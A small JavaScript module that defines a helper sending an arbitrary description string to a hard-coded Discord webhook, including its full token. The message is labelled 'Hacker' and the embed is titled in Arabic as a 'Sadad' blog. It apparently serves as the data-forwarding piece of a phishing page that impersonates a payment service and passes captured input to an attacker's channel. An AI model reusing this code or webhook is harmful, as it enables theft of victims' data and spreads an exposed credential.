import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1329147961166266470/8a0zArr5RvWN65dz7DEx33DljEBDmw52ztDmY7DqLAU3jPiT8hxN1zC8hgELD627WLBP",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
